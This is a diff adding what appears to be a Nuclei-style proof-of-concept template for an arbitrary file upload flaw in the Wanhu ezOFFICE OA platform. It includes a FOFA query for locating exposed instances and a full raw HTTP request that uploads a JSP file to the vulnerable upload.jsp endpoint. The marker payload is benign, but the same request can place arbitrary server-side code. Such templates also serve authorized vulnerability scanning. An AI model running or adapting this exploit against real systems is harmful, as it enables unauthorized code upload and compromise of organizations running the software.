@@ -1,0 +1,68 @@
+id: poc-yntqkhgb34xsgn7x
+info:
+  name: 万户OA upload任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yntqkhgb34xsgn7x'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: yntqkhgb34xsgn7x
+    fofa: app="万户ezOFFICE协同管理平台"
+http:
+- raw:
+  - 'POST /defaultroot/platform/portal/layout/common/upload.jsp?portletSettingId=123&path=abc HTTP/1.1
+
+
+    Upgrade-Insecure-Requests: 1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Content-Type: multipart/form-data; boundary=b0d829daa06c13d6b3e16b0ad21d1eed
+
+
+
+
+    --b0d829daa06c13d6b3e16b0ad21d1eed
+
+
+    Content-Disposition: form-data; name="file"; filename="dudesuite.jsp"
+
+
+    Content-Type: application/octet-stream
+
+
+
+
+    <%out.print("dudesuite");%>
+
+
+    --b0d829daa06c13d6b3e16b0ad21d1eed--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?上传成功)(?=.*?jsp).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
